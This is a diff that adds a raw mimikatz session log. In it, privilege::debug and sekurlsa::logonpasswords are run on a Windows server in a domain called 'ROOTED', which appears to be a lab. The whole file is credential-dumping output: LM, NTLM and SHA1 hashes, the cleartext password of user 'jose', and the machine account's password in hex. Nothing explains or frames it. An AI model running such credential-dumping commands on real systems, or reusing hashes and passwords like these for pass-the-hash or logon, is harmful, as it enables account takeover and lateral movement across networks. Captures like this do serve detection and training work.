@@ -1,0 +1,174 @@
+
+  .#####.   mimikatz 2.1.1 (x64) #17763 Dec  9 2018 23:56:50
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 208286 (00000000:00032d9e)
+Session           : Interactive from 1
+User Name         : jose
+Domain            : ROOTED
+Logon Server      : DC
+Logon Time        : 07/03/2023 11:01:08
+SID               : S-1-5-21-4001629950-4265076451-4074222949-1603
+	msv :	
+	 [00000003] Primary
+	 * Username : jose
+	 * Domain   : ROOTED
+	 * LM       : b7515dc140629d415aacd84cd494924f
+	 * NTLM     : 3e45171bc9c91d797d4c561b648ec753
+	 * SHA1     : 7f44ed15c922bc90fae5c4b45dc53e911e9042ad
+	tspkg :	
+	 * Username : jose
+	 * Domain   : ROOTED
+	 * Password : abc123..
+	wdigest :	
+	 * Username : jose
+	 * Domain   : ROOTED
+	 * Password : abc123..
+	kerberos :	
+	 * Username : jose
+	 * Domain   : ROOTED.LOCAL
+	 * Password : abc123..
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 208246 (00000000:00032d76)
+Session           : Interactive from 1
+User Name         : jose
+Domain            : ROOTED
+Logon Server      : DC
+Logon Time        : 07/03/2023 11:01:08
+SID               : S-1-5-21-4001629950-4265076451-4074222949-1603
+	msv :	
+	 [00000003] Primary
+	 * Username : jose
+	 * Domain   : ROOTED
+	 * LM       : b7515dc140629d415aacd84cd494924f
+	 * NTLM     : 3e45171bc9c91d797d4c561b648ec753
+	 * SHA1     : 7f44ed15c922bc90fae5c4b45dc53e911e9042ad
+	tspkg :	
+	 * Username : jose
+	 * Domain   : ROOTED
+	 * Password : abc123..
+	wdigest :	
+	 * Username : jose
+	 * Domain   : ROOTED
+	 * Password : abc123..
+	kerberos :	
+	 * Username : jose
+	 * Domain   : ROOTED.LOCAL
+	 * Password : abc123..
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : SERVER2008$
+Domain            : ROOTED
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:17
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : SERVER2008$
+	 * Domain   : ROOTED
+	 * NTLM     : 56f3b9f3bb388a5df3b98e0780b651fd
+	 * SHA1     : 0a153fcbb41af650e0925b70a342e2d240bac75d
+	tspkg :	
+	wdigest :	
+	 * Username : SERVER2008$
+	 * Domain   : ROOTED
+	 * Password : 5e 39 cb 01 23 21 1f 2b 9a 2a e7 2d 1c e7 63 89 97 77 60 28 02 33 15 2b 5c cb 49 74 72 84 bd e2 c1 6d 8e f7 3b cd 48 2a 76 d2 0a 13 32 10 8c e8 61 36 ed ba eb 36 6b 40 98 6e cf de 9b 5e 3a 39 f2 b8 b9 36 01 a1 5e 30 87 e6 70 69 76 f6 40 90 28 d3 cd 2e db 18 15 8d 36 45 2a 63 0b c4 95 a5 67 0a 58 86 9d a4 24 4f 16 e3 c9 45 0f 9a 79 51 57 b2 25 69 4d d0 99 df a1 08 ab d1 52 2c d3 db 49 52 0e 6b 5a fa 10 e6 94 5e 19 c1 0e 1c 42 7e b3 06 03 b0 40 7f ef 73 84 38 00 3d 9c 2e ff 60 06 39 83 76 17 4f c8 ed e9 77 9a 80 a3 fa c3 c1 fc ff b4 e1 2f e8 0e c0 99 66 93 4c 01 65 bc 89 82 d3 d8 60 2a 2d 9e 4f 27 8d 68 a6 de b4 84 9c 77 ba 9d 58 cd 4b c0 cd fa ce e2 29 eb 45 e0 41 d8 ab 7e 97 d7 8a 21 20 3d c0 03 a1 fa f2 79 66 
+	kerberos :	
+	 * Username : server2008$
+	 * Domain   : ROOTED.LOCAL
+	 * Password : 5e 39 cb 01 23 21 1f 2b 9a 2a e7 2d 1c e7 63 89 97 77 60 28 02 33 15 2b 5c cb 49 74 72 84 bd e2 c1 6d 8e f7 3b cd 48 2a 76 d2 0a 13 32 10 8c e8 61 36 ed ba eb 36 6b 40 98 6e cf de 9b 5e 3a 39 f2 b8 b9 36 01 a1 5e 30 87 e6 70 69 76 f6 40 90 28 d3 cd 2e db 18 15 8d 36 45 2a 63 0b c4 95 a5 67 0a 58 86 9d a4 24 4f 16 e3 c9 45 0f 9a 79 51 57 b2 25 69 4d d0 99 df a1 08 ab d1 52 2c d3 db 49 52 0e 6b 5a fa 10 e6 94 5e 19 c1 0e 1c 42 7e b3 06 03 b0 40 7f ef 73 84 38 00 3d 9c 2e ff 60 06 39 83 76 17 4f c8 ed e9 77 9a 80 a3 fa c3 c1 fc ff b4 e1 2f e8 0e c0 99 66 93 4c 01 65 bc 89 82 d3 d8 60 2a 2d 9e 4f 27 8d 68 a6 de b4 84 9c 77 ba 9d 58 cd 4b c0 cd fa ce e2 29 eb 45 e0 41 d8 ab 7e 97 d7 8a 21 20 3d c0 03 a1 fa f2 79 66 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:21
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : SERVICIO LOCAL
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:18
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 22399 (00000000:0000577f)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:17
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : SERVER2008$
+	 * Domain   : ROOTED
+	 * NTLM     : 56f3b9f3bb388a5df3b98e0780b651fd
+	 * SHA1     : 0a153fcbb41af650e0925b70a342e2d240bac75d
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SERVER2008$
+Domain            : ROOTED
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:17
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : SERVER2008$
+	 * Domain   : ROOTED
+	 * Password : 5e 39 cb 01 23 21 1f 2b 9a 2a e7 2d 1c e7 63 89 97 77 60 28 02 33 15 2b 5c cb 49 74 72 84 bd e2 c1 6d 8e f7 3b cd 48 2a 76 d2 0a 13 32 10 8c e8 61 36 ed ba eb 36 6b 40 98 6e cf de 9b 5e 3a 39 f2 b8 b9 36 01 a1 5e 30 87 e6 70 69 76 f6 40 90 28 d3 cd 2e db 18 15 8d 36 45 2a 63 0b c4 95 a5 67 0a 58 86 9d a4 24 4f 16 e3 c9 45 0f 9a 79 51 57 b2 25 69 4d d0 99 df a1 08 ab d1 52 2c d3 db 49 52 0e 6b 5a fa 10 e6 94 5e 19 c1 0e 1c 42 7e b3 06 03 b0 40 7f ef 73 84 38 00 3d 9c 2e ff 60 06 39 83 76 17 4f c8 ed e9 77 9a 80 a3 fa c3 c1 fc ff b4 e1 2f e8 0e c0 99 66 93 4c 01 65 bc 89 82 d3 d8 60 2a 2d 9e 4f 27 8d 68 a6 de b4 84 9c 77 ba 9d 58 cd 4b c0 cd fa ce e2 29 eb 45 e0 41 d8 ab 7e 97 d7 8a 21 20 3d c0 03 a1 fa f2 79 66 
+	kerberos :	
+	 * Username : server2008$
+	 * Domain   : ROOTED.LOCAL
+	 * Password : 5e 39 cb 01 23 21 1f 2b 9a 2a e7 2d 1c e7 63 89 97 77 60 28 02 33 15 2b 5c cb 49 74 72 84 bd e2 c1 6d 8e f7 3b cd 48 2a 76 d2 0a 13 32 10 8c e8 61 36 ed ba eb 36 6b 40 98 6e cf de 9b 5e 3a 39 f2 b8 b9 36 01 a1 5e 30 87 e6 70 69 76 f6 40 90 28 d3 cd 2e db 18 15 8d 36 45 2a 63 0b c4 95 a5 67 0a 58 86 9d a4 24 4f 16 e3 c9 45 0f 9a 79 51 57 b2 25 69 4d d0 99 df a1 08 ab d1 52 2c d3 db 49 52 0e 6b 5a fa 10 e6 94 5e 19 c1 0e 1c 42 7e b3 06 03 b0 40 7f ef 73 84 38 00 3d 9c 2e ff 60 06 39 83 76 17 4f c8 ed e9 77 9a 80 a3 fa c3 c1 fc ff b4 e1 2f e8 0e c0 99 66 93 4c 01 65 bc 89 82 d3 d8 60 2a 2d 9e 4f 27 8d 68 a6 de b4 84 9c 77 ba 9d 58 cd 4b c0 cd fa ce e2 29 eb 45 e0 41 d8 ab 7e 97 d7 8a 21 20 3d c0 03 a1 fa f2 79 66 
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # exit
+Bye!
